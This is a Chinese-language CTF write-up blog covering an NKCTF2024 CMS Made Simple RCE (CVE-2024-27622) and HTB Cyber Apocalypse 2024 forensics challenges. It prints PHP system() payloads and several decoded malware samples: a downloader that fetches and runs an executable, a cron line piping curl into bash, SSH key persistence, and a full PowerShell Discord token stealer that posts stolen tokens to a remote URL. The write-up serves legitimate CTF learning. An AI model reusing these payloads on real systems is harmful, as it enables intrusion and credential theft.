title="web"></a>web</h2><h3 id="my-first-cms-CVE-2024-27622"><a href="#my-first-cms-CVE-2024-27622" class="headerlink" title="my first cms(CVE-2024-27622)"></a>my first cms(CVE-2024-27622)</h3><p>首先dirsearch扫目录 扫到后台登陆页面<code>admin/login.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242112791.png" alt="image-20240324211243701"></p><p>抓个包开始爆破登陆密码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242115397.png" alt="image-20240324211527287"></p><p>比较抽象是<code>admin/Admin123</code> 登陆后台 </p><p>注意到这个<code>CMSMadeSimple</code>框架的版本是2.2.19  搜一波漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242120123.png" alt="image-20240324212044011"></p><p><a href="https://github.com/capture0x/CMSMadeSimple">CVE-2024-27622</a></p><p>直接进行利用 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242122358.png" alt="image-20240324212227274"></p><p> 先抓<code>&lt;?php echo system(&#39;id&#39;); ?&gt;</code>测试一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242123611.png" alt="image-20240324212348525"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242124243.png" alt="image-20240324212408092"></p><p>成功回显 再看一下根目录 </p><pre><code>&lt;?php system(&quot;ls /&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242127820.png" alt="image-20240324212741748"></p><p>读取flag</p><pre><code>&lt;?php system(&quot;cat /_fffff1@g&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242128199.png" alt="image-20240324212836091"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NKCTF2024&quot;&gt;&lt;a href=&quot;#NKCTF2024&quot; class=&quot;headerlink&quot; title=&quot;NKCTF2024&quot;&gt;&lt;/a&gt;NKCTF2024&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HTBCyberCTF2024</title>
    <link href="http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/"/>
    <id>http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/</id>
    <published>2024-03-16T11:52:36.682Z</published>
    <updated>2024-03-16T11:53:10.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTBCyberCTF2024"><a href="#HTBCyberCTF2024" class="headerlink" title="HTBCyberCTF2024"></a>HTBCyberCTF2024</h1><h2 id="Forensics-部分"><a href="#Forensics-部分" class="headerlink" title="Forensics(部分)"></a>Forensics(部分)</h2><h3 id="Urgent"><a href="#Urgent" class="headerlink" title="Urgent"></a>Urgent</h3><p>给的附件是一个xml文件 直接notepad打开 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111402394.png" alt="image-20240311140231315"></p><p>解base64</p><pre><code>document.write(unescape(&#39;&gt;_ 404 Not FoundSub window_onloadconst impersonation = 3Const HIDDEN_WINDOW = 12Set Locator = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)Set Service = Locator.ConnectServer()Service.Security_.ImpersonationLevel=impersonationSet objStartup = Service.Get(&quot;Win32_ProcessStartup&quot;)Set objConfig = objStartup.SpawnInstance_Set Process = Service.Get(&quot;Win32_Process&quot;)Error = Process.Create(&quot;cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(&#39;https://standunited.htb/online/forms/form1.exe&#39;,&#39;%appdata%\form1.exe&#39;);Start-Process &#39;%appdata%\form1.exe&#39;;$flag=&#39;HTB&#123;4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT&#125;&quot;, null, objConfig, intProcessID)window.close()end sub&#39;));</code></pre><p>拿到flag</p><h3 id="It-Has-Begun"><a href="#It-Has-Begun" class="headerlink" title="It Has Begun"></a>It Has Begun</h3><pre><code>The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.</code></pre><p>直接仔细翻看给的script.sh  找到两段关键的</p><pre><code>echo &quot;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w&#123;BTH&quot; &gt;&gt; /root/.ssh/authorized_keysecho &quot;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; &quot; &gt;&gt; /etc/crontab</code></pre><p>第一段flag</p><pre><code>HTB&#123;w1ll_y0u_St</code></pre><p>第二段是解base64<code>NG5kX3kwdVJfR3IwdU5kISF9</code></p><pre><code>4nd_y0uR_Gr0uNd!!&#125;</code></pre><h3 id="An-unusual-sighting"><a href="#An-unusual-sighting" class="headerlink" title="An unusual sighting"></a>An unusual sighting</h3><pre><code>As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!随着准备工作的结束，以及 The Fray 的临近，我们新成立的团队已经开始为比赛重构新的 CMS 应用程序。然而，一段时间后，我们注意到我们的很多工作都神秘地消失了！我们设法从有问题的开发服务器中提取了 SSH 日志和 Bash 历史记录。设法发现肇事者的派系将获得巨大的奖金！</code></pre><p>使用nc连接docker容器 </p><p>第一个问题</p><pre><code>What is the IP Address and Port of the SSH Server (IP:PORT)</code></pre><p>问的是通过ssh连接的ip和端口是什么 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151122502.png" alt="image-20240315112236452"></p><p>看到第三行的连接记录 前面的ip和端口是发起连接的 后面的ip和端口是连接的目标 后面的记录都是如此 那后面的ip和端口就是想通过ssh进行连接的ip和端口</p><pre><code>100.107.36.130:2221</code></pre><p>第二个问题</p><pre><code>What time is the first successful Login</code></pre><p>问的是第一次成功连接的时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151126225.png" alt="image-20240315112617183"></p><p>可以看到第一次连接是失败了 第二次连接成功 那第二次连接就是第一次成功连接 </p><pre><code>2024-02-13 11:29:50</code></pre><p>第三个问题</p><pre><code>What is the time of the unusual Login</code></pre><p>问的是非常规登陆的时间 </p><p>这里可能问的是特殊ip的登陆  只有一个特殊ip<code>2.67.182.119</code> 看着很像挖矿病毒或者攻击者的外部ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151603252.png" alt="image-20240315160355183"></p><pre><code>2024-02-19 04:00:14</code></pre><p>第四个问题</p><pre><code>What is the Fingerprint of the attacker&#39;s public key</code></pre><p>承接上一题 </p><pre><code>OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4</code></pre><p>第五个问题</p><pre><code>What is the first command the attacker executed after logging in</code></pre><p>问的是攻击者在登陆之后执行的第一个命令是什么</p><p>看<code>bash_history.txt</code> 由第三个问题知道攻击者是在<code>2024-02-19 04:00:14</code>之后登陆的 直接找这个时间对应的命令记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151615339.png" alt="image-20240315161550301"></p><pre><code>whoami</code></pre><p>第六个问题</p><pre><code>What is the final command the attacker executed before logging out</code></pre><p>问的是攻击者在登陆注销前执行的最后一个命令是什么</p><p>看<code>sshd.log</code> 攻击者是在<code>2024-02-19 04:38:17</code> 进行注销的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151618823.png" alt="image-20240315161830759"></p><p>再在<code>bash_history.txt</code>里面看看这个时间前执行的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151619193.png" alt="image-20240315161928153"></p><pre><code>./setup</code></pre><p>然后就可以拿到flag</p><pre><code>HTB&#123;B3sT_0f_luck_1n_th3_Fr4y!!&#125;</code></pre><h3 id="Fake-Boost"><a href="#Fake-Boost" class="headerlink" title="Fake Boost"></a>Fake Boost</h3><pre><code>In the shadow of The Fray, a new test called &quot;&quot;Fake Boost&quot;&quot; whispers promises of free Discord Nitro perks. It&#39;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.</code></pre><p>在流量包中提取出来一个文件<code>freediscordnitro</code> 查看内容 发现是对一个字符串的处理 </p><pre><code>$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2&gt;&amp;1&gt; $null ;$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [sYSTeM.TeXt.ENcODING]::UTf8.geTSTRiNG([SYSTEm.cOnVeRT]::FRoMBaSe64sTRing(&quot;$s0yAY2gmHVNFd7QZ&quot;)) ;</code></pre><p>先是将字符串进行反转 然后在解base64 </p><pre><code>$URL = &quot;http://192.168.116.135:8080/rj1893rj1joijdkajwda&quot;function Steal &#123;    param (        [string]$path    )    $tokens = @()    try &#123;        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object &#123;                        try &#123;                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop                foreach ($regex in @(&#39;[\w-]&#123;26&#125;\.[\w-]&#123;6&#125;\.[\w-]&#123;25,110&#125;&#39;, &#39;mfa\.[\w-]&#123;80,95&#125;&#39;)) &#123;                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object &#123;                        $_.Matches.Value                    &#125;                &#125;            &#125; catch &#123;&#125;        &#125;    &#125; catch &#123;&#125;    return $tokens&#125;function GenerateDiscordNitroCodes &#123;    param (        [int]$numberOfCodes = 10,        [int]$codeLength = 16    )    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;    $codes = @()    for ($i = 0; $i -lt $numberOfCodes; $i++) &#123;        $code = -join (1..$codeLength | ForEach-Object &#123; Get-Random -InputObject $chars.ToCharArray() &#125;)        $codes += $code    &#125;    return $codes&#125;function Get-DiscordUserInfo &#123;    [CmdletBinding()]    Param (        [Parameter(Mandatory = $true)]        [string]$Token    )    process &#123;        try &#123;            $Headers = @&#123;                &quot;Authorization&quot; = $Token                &quot;Content-Type&quot; = &quot;application/json&quot;                &quot;User-Agent&quot; = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&quot;            &#125;            $Uri = &quot;https://discord.com/api/v9/users/@me&quot;            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers            return $Response        &#125;        catch &#123;&#125;    &#125;&#125;function Create-AesManagedObject($key, $IV, $mode) &#123;    $aesManaged = New-Object &quot;System.Security.Cryptography.AesManaged&quot;    if ($mode=&quot;CBC&quot;) &#123; $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC &#125;    elseif ($mode=&quot;CFB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB&#125;    elseif ($mode=&quot;CTS&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS&#125;    elseif ($mode=&quot;ECB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB&#125;    elseif ($mode=&quot;OFB&quot;)&#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB&#125;    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7    $aesManaged.BlockSize = 128    $aesManaged.KeySize = 256    if ($IV) &#123;        if ($IV.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.IV = [System.Convert]::FromBase64String($IV)        &#125;        else &#123;            $aesManaged.IV = $IV        &#125;    &#125;    if ($key) &#123;        if ($key.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.Key = [System.Convert]::FromBase64String($key)        &#125;        else &#123;            $aesManaged.Key = $key        &#125;    &#125;    $aesManaged&#125;function Encrypt-String($key, $plaintext) &#123;    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)    $aesManaged = Create-AesManagedObject $key    $encryptor = $aesManaged.CreateEncryptor()    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);    [byte[]] $fullData = $aesManaged.IV + $encryptedData    [System.Convert]::ToBase64String($fullData)&#125;Write-Host &quot;______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ |  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   || |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `&#39; / /&#39;| |/&#39; |`&#39; / /&#39;/ /| ||  _| &#39;__/ _ \/ _ \ | | | | / __|/ __/ _ \| &#39;__/ _` | | . ` | | __| &#39;__/ _ \    / /  |  /| |  / / / /_| || | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/                                                                                                                                                                                                                  &quot;Write-Host &quot;Generating Discord nitro keys! Please be patient...&quot;$local = $env:LOCALAPPDATA$roaming = $env:APPDATA$part1 = &quot;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf&quot;$paths = @&#123;    &#39;Google Chrome&#39; = &quot;$local\Google\Chrome\User Data\Default&quot;    &#39;Brave&#39; = &quot;$local\BraveSoftware\Brave-Browser\User Data\Default\&quot;    &#39;Opera&#39; = &quot;$roaming\Opera Software\Opera Stable&quot;    &#39;Firefox&#39; = &quot;$roaming\Mozilla\Firefox\Profiles&quot;&#125;$headers = @&#123;    &#39;Content-Type&#39; = &#39;application/json&#39;    &#39;User-Agent&#39; = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&#39;&#125;$allTokens = @()foreach ($platform in $paths.Keys) &#123;    $currentPath = $paths[$platform]    if (-not (Test-Path $currentPath -PathType Container)) &#123;continue&#125;    $tokens = Steal -path $currentPath    $allTokens += $tokens&#125;$userInfos = @()foreach ($token in $allTokens) &#123;    $userInfo = Get-DiscordUserInfo -Token $token    if ($userInfo) &#123;        $userDetails = [PSCustomObject]@&#123;            ID = $userInfo.id            Email = $userInfo.email            GlobalName = $userInfo.global_name            Token = $token        &#125;        $userInfos += $userDetails    &#125;&#125;$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;$payload = $userInfos | ConvertTo-Json -Depth 10$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payloadtry &#123;    $headers = @&#123;        &#39;Content-Type&#39; = &#39;text/plain&#39;        &#39;User-Agent&#39; = &#39;Mozilla/5.0&#39;    &#125;    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData&#125;catch &#123;&#125;Write-Host &quot;Success! Discord Nitro Keys:&quot;$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16$keys | ForEach-Object &#123; Write-Output $_ &#125;</code></pre><p>找到第一部分flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908010.png" alt="image-20240311190848912"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908936.png" alt="image-20240311190856886"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_</code></pre><p>流量包里面还有一个文件<code>rj1893rj1joijdkajwda</code> </p><pre><code>bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==</code></pre><p>不能直接解base64 应该是aes解密 需要找密钥  密钥其实也在上面解base64之后的字符串里面 </p><pre><code>$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;</code></pre><p>需要解一下base64 </p><pre><code>cWphrNTk9wgWZ93t19jayqnlaDuIeFKi</code></pre><p>这个有点特殊  是CBC模式的解密  但是没有偏移值 好像只有这个网站可以做到</p><p><a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES解密</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151103552.png" alt="image-20240315110356503"></p><pre><code>ui(wyXØU(î6Nx[    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;,    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;]</code></pre><p>里面的 <code>Email</code> 部分再解base64就是flag2</p><pre><code>b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151106059.png" alt="image-20240315110637977"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><h3 id="Phreaky"><a href="#Phreaky" class="headerlink" title="Phreaky"></a>Phreaky</h3><p>先看协议分级  主要是tcp协议</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122000172.png" alt="image-20240312200010100"></p><p>直接追踪tcp流  看到从第一个包开始 奇数包都传输了一个压缩包 密码直接在包中显示出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122002053.png" alt="image-20240312200230965"></p><p>一共有15个这样的压缩包  将字符串提取出来 先解base64 在另存为压缩包 使用相应的密码进行解压 观察第一个解压的文件 应该是一个pdf文件 分成了15个部分 最后将这15个文件全部进行拼接 得到完整的pdf文件 在末尾找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122042924.png" alt="image-20240312204207845"></p><h3 id="data-siege"><a href="#data-siege" class="headerlink" title="data_siege"></a>data_siege</h3><pre><code>&quot;It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city&#39;s messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.&quot;</code></pre><p>题干告诉我们flag分为三部分 </p><p>附件是一个流量包  看了一眼协议分级  主要是TCP协议的流量包</p><p>看一下可以导出的HTTP对象 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141055864.png" alt="image-20240314105505835"></p><p>将这个<code>aQ4caZ.exe</code> 导出 直接放在010里面看 找到一部分字符串 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141056081.png" alt="image-20240314105640043"></p><pre><code>Very_S3cr3t_S</code></pre><p>开始以为这是一部分flag  后来发现这个不是 是AES加密密钥的盐值</p><p>追踪tcp流 在第五个包发现好像是base64的字符串 解一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141102380.png" alt="image-20240314110226319"></p><p>看到flag part3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141103418.png" alt="image-20240314110335330"></p><p>但是数据很乱  应该是前面有混淆字符 整理一下 重新解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141105217.png" alt="image-20240314110525109"></p><pre><code>0r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><p>到这一步 第五个包剩下的部分应该还是要进行解密 猜测是AES解密 但是解密密钥偏移值等信息 就是要分析上面提取出来的exe程序 进行逆向  这边要使用dnspy进行调试分析 </p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnspy下载安装</a></p><p>直接使用dnspy将<code>aQ4caZ.exe</code>打开 可以看到这个程序原本的名字是<code>EZRATClient</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161648741.png" alt="image-20240316164845657"></p><p>找到解密函数 </p><pre><code class="c#">public static string Decrypt(string cipherText)&#123;    string result;    try    &#123;        string encryptKey = Constantes.EncryptKey;        byte[] array = Convert.FromBase64String(cipherText);        using (Aes aes = Aes.Create())        &#123;            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]            &#123;                86,                101,                114,                121,                95,                83,                51,                99,                114,                51,                116,                95,                83            &#125;);            aes.Key = rfc2898DeriveBytes.GetBytes(32);            aes.IV = rfc2898DeriveBytes.GetBytes(16);            using (MemoryStream memoryStream = new MemoryStream())            &#123;                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                &#123;                    cryptoStream.Write(array, 0, array.Length);                    cryptoStream.Close();                &#125;                cipherText = Encoding.Default.GetString(memoryStream.ToArray());            &#125;        &#125;        result = cipherText;    &#125;    catch (Exception ex)    &#123;        Console.WriteLine(ex.Message);        Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);        result = &quot;error&quot;;    &#125;    return result;&#125;</code></pre><p>里面提到的这个<code>encryptKey</code>  可以在下面找到<code>EZRATClient.Core--Constantes--_encryptKey</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161703743.png" alt="image-20240316170317697"></p><pre><code>VYAemVeO3zUDTL6N62kVA</code></pre><p>那解密函数在程序里面已经给了 需要用到的密钥也给了 只是这段解密代码缺少一部分对密文的输出和对解密 补上就可以</p><pre><code class="c#">using System;using System.IO;using System.Security.Cryptography;using System.Text;public static class Program&#123;    public static void Main(string[] args)    &#123;        // 测试解密方法        string cipherText = &quot;ZKlcDuS6syl4/w1JGgzkYxeaGTSooLkoI62mUeJh4hZgRRytOHq8obQ7o133pBW7BilbKoUuKeTvXi/2fmd4v+gOO/E6A0DGMWiW2+XZ+lkDa97VsbxXAwm0zhunRyBXHuo8TFbQ3wFkFtA3SBFDe+LRYQFB/Kzk/HX/EomfOj2aDYRGYBCHiGS70BiIC/gyNOW6m0xTu1oZx90SCoFel95v+vi8I8rQ1N6Dy/GPMuhcSWAJ8M9Q2N7fVEz92HWYoi8K5Zvge/7REg/5GKT4pu7KnnFCKNrTp9AqUoPuHm0cWy9J6ZxqwuOXTR8LzbwbmXohANtTGso6Dqbih7aai57uVAktF3/uK5nN7EgMSC0ZsUclzPZjm0r4ITE2HtBrRXJ78cUfIbxd+dIDBGts7IuDfjr0qyXuuzw+5o8pvKkTemvTcNXzNQbSWj+5tTxxly0Kgxi5MVT0ecyJfNfdZG0slqYHKaqJCZm6ShfvGRFsglKmenBB274sBdkVqIRtodB8dD1AM1ZQQX1MBMGDeCwFqc+ahch0x375U6Ekmvf2fzCZ/IaHOHBc8p5se1oNMRbIqcJaundh5cuYL/h8p/NPVTK9veu3Qihy310wkjg=&quot;; // 你的密文        string decryptedText = Decrypt(cipherText);        Console.WriteLine(&quot;Decrypted Text: &quot; + decryptedText);    &#125;    public static string Decrypt(string cipherText)    &#123;        string result;        try        &#123;            string key = &quot;VYAemVeO3zUDTL6N62kVA&quot;; // 添加密钥            byte[] array = Convert.FromBase64String(cipherText);            using (Aes aes = Aes.Create())            &#123;                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, new byte[]                &#123;                    86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83                &#125;);                aes.Key = rfc2898DeriveBytes.GetBytes(32);                aes.IV = rfc2898DeriveBytes.GetBytes(16);                using (MemoryStream memoryStream = new MemoryStream())                &#123;                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                    &#123;                        cryptoStream.Write(array, 0, array.Length);                    &#125;                    byte[] decryptedBytes = memoryStream.ToArray();                    result = Encoding.UTF8.GetString(decryptedBytes); // 使用UTF-8编码解码明文                &#125;            &#125;        &#125;        catch (Exception ex)        &#123;            Console.WriteLine(ex.Message);            Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);            result = &quot;error&quot;;        &#125;        return result;    &#125;&#125;// Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB&#123;c0mmun1c4710n5 &gt;&gt; C:\Users\svc01\.ssh\authorized_keys</code></pre><p>出来了flag1  后面继续对tcp流5中的内容进行解密 得到flag2</p><pre><code class="c#">zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg// Decrypted Text: cmd;C:\;Username: svc01 Password: Passw0rdCorp5421 2nd flag part: _h45_b33n_r357</code></pre><p>完整flag</p><pre><code>HTB&#123;c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><h3 id="Pursue-The-Tracks"><a href="#Pursue-The-Tracks" class="headerlink" title="Pursue The Tracks"></a>Pursue The Tracks</h3><pre><code>Luxx, leader of The Phreaks, immerses himself in the depths of his computer, tirelessly pursuing the secrets of a file he obtained accessing an opposing faction member workstation. With unwavering determination, he scours through data, putting together fragments of information trying to take some advantage on other factions. To get the flag, you need to answer the questions from the docker instance.</code></pre><p>题目告诉我们 如果想要拿到flag  需要回答docker容器里面的问题 </p><p>给到的附件是一个MFT文件 是NTFS文件系统的备份文件 </p><pre><code>MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File 